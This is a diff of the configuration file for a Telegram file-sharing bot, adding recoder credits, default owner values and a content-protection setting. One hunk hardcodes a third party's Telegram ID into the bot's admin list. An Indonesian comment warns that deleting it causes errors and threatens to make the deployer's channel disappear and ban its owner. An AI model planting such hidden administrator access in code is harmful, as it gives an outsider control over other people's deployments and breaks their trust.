@@ -1,3 +1,7 @@
+# (©)Codexbotz
+# Recode by @mrismanaziz
+# t.me/SharingUserbot & t.me/Lunatic0de
+
 import logging
 import os
 from dotenv import load_dotenv
@@ -18,21 +22,20 @@ API_HASH = os.environ.get("API_HASH", "")
 CHANNEL_ID = int(os.environ.get("CHANNEL_ID", ""))
 
 # OWNER ID
-OWNER_ID = int(os.environ.get("OWNER_ID", ""))
+OWNER_ID = int(os.environ.get("OWNER_ID", "1926379604"))
 
 # NAMA OWNER
-OWNER = os.environ.get("OWNER", "Nekocannn")
+OWNER = os.environ.get("OWNER", "fckandnight")
 
 # Database
 DB_URI = os.environ.get("DATABASE_URL", "")
 
-# Username CH & Group
-CHANNEL = os.environ.get("CHANNEL", "0")
-GROUP = os.environ.get("GROUP", "0")
-
 # ID dari Channel Atau Group Untuk Wajib Subscribenya
 FORCE_SUB_CHANNEL = int(os.environ.get("FORCE_SUB_CHANNEL", "0"))
 FORCE_SUB_GROUP = int(os.environ.get("FORCE_SUB_GROUP", "0"))
+
+#PROTECT
+PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False
 
 TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))
 
@@ -55,17 +58,13 @@ FORCE_MSG = os.environ.get(
 # Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
 CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 
-#set True if you want to prevent users from forwarding files from bot
-PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False
-
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
 ADMINS.append(OWNER_ID)
-#ADMINS.append(844432220)
-#ADMINS.append(1250450587)
-#ADMINS.append(1750080384)
-#ADMINS.append(2102118281)
+# Jangan Dihapus nanti ERROR, HAPUS ID Dibawah ini = TERIMA KONSEKUENSI
+# Spoiler KONSEKUENSI-nya Paling CH nya tiba tiba ilang & owner nya gua gban 🤪
+ADMINS.extend((OWNER_ID, 1776634207))
 
 
 LOG_FILE_NAME = "logs.txt"
@@ -78,7 +77,7 @@ logging.basicConfig(
         logging.StreamHandler(),
     ],
 )
-logging.getLogger("pyrogram").setLevel(logging.ERROR)
+logging.getLogger("pyrogram").setLevel(logging.WARNING)
 
 
 def LOGGER(name: str) -> logging.Logger:
